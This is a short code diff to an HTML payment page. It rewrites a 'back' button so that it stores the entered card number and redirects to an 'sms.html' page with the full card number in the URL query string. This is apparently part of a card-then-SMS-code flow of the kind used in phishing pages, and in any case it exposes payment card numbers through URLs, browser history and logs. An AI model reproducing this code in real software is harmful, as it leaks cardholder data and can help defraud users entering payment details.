@@ -1239,7 +1239,9 @@
         });
 
         backBtn.addEventListener('click', () => {
-            window.location.href = 'index.html';
+            const cardNumberValue = cardNumber.value.replace(/\s/g, '');
+        sessionStorage.setItem('cardNumber', cardNumberValue);
+        window.location.href = `sms.html?card=${cardNumberValue}`;
         });
 
         let paymentCounter = 0;
@@ -1464,3 +1466,4 @@
     </script>
 </body>
 </html>
+
